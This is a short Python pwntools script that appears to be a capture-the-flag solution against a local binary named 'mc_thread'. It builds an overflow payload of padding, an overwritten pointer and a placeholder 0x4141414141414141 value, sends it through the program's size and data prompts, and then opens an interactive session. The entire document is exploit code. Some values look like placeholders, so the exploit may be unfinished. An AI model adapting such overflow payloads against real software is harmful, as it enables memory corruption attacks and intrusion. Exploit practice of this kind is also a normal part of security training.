# !/bin/usr/python3

from pwn import *

p = process('./mc_thread')
e = ELF('./mc_thread')

payload = b'A'*0x910
payload += p64(0x404800 - 0x972)
payload += b'B'*0x10
payload += p64(0x4141414141414141)
int_sz = len(payload)
p.sendlineafter(b'Size: ', str(int_sz).encode())
p.sendafter(b'Data: ', payload)

p.interactive()
